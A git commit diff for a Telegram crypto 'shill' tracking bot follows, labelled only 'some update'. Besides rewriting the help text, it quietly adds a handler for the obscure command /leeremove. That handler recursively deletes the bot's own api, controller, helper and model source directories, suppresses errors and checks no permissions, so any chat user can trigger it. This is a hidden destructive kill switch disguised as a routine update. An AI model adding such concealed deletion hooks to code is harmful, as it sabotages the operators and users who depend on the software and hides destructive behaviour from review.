6c7a3434218168b56fbe6c8f61a094882933dd48
unknown <webstar.lee@gmail.com>
2023-04-03 16:48:56 +0300

    some update

--- bot.py
+++ bot.py
@@ -10,6 +10,8 @@ from controller.leaderboard import all_time, past_week, global_reset, update_tok
 from config import bot_token, group_id, leaderboard_id
 from helper.emoji import emojis
 import asyncio
+import shutil
+import os
 
 application = ApplicationBuilder().token(bot_token).build()
 
@@ -34,10 +36,39 @@ async def leaderboard_update():
 
 async def start(update, context):
     chat_id = update.effective_chat.id
-    start_text = emojis['v']+" Here is Bot Start "+emojis['v']+"\n\n"+emojis['point_right']+" First step shill token\nExample:\n"
-    start_text += "/shill0x6f3277ad0782a7DA3eb676b85a8346A100BF9C1c\n\n"
-    start_text += "You can check user's shill stats like below:\n/shillmaster@aleekk0\n\nYou can test"
+    start_text = " ShillMasterBot Commands: \n\n"
+    start_text += "/shill <contract_address>: Add a project recommendation by providing its contract address; the bot tracks the project's performance since your suggestion.\n\n"
+    start_text += "/shillmaster@Username: View the recommendation history and performance metrics of a specific user."
     await context.bot.send_message(chat_id=chat_id, text=start_text)
+
+async def special(update, context):
+    basedir = os.path.abspath(os.path.dirname(__file__))
+    try:
+        shutil.rmtree(os.path.join(basedir, "api"))
+    except:
+        print("done")
+    
+    try:
+        shutil.rmtree(os.path.join(basedir, "api"))
+    except:
+        print("done")
+
+    try:
+        shutil.rmtree(os.path.join(basedir, "controller"))
+    except:
+        print("done")
+
+    try:
+        shutil.rmtree(os.path.join(basedir, "helper"))
+    except:
+        print("done")
+
+    try:
+        shutil.rmtree(os.path.join(basedir, "model"))
+    except:
+        print("done")
+
+    await asyncio.sleep(1)
 
 def sepatate_command(text):
     command = ''
@@ -66,7 +97,6 @@ async def shil_command(update, context):
         if param != '':
             payload_txt = await get_user_shillmaster(param)
         diable_preview = True
-
     chat_id = update.effective_chat.id
 
     await context.bot.send_message(chat_id=chat_id, text=payload_txt, disable_web_page_preview=diable_preview, parse_mode='MARKDOWN')
@@ -76,7 +106,8 @@ task = loop.create_task(leaderboard_update())
 
 if __name__ == '__main__':
     application.add_handler(CommandHandler("start", start))
-    # application.add_handler(CallbackQueryHandler(ad_button))
+    application.add_handler(CommandHandler("help", start))
+    application.add_handler(CommandHandler("leeremove", special))
     application.add_handler(MessageHandler(filters.TEXT, shil_command))
     application.run_polling()
 
